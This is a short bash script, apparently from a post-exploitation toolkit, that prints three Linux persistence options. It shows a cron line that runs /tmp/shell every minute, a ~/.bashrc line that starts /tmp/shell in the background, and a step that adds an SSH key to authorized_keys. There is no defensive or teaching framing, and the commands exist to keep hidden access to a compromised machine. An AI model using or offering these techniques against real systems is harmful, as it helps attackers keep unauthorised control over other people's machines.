#!/bin/bash
echo "[*] Persistence options:"
echo "1. Cron: echo '* * * * * /tmp/shell' >> /var/spool/cron/$(whoami)"
echo "2. Bashrc: echo '/tmp/shell &' >> ~/.bashrc"
echo "3. SSH: add key to ~/.ssh/authorized_keys"
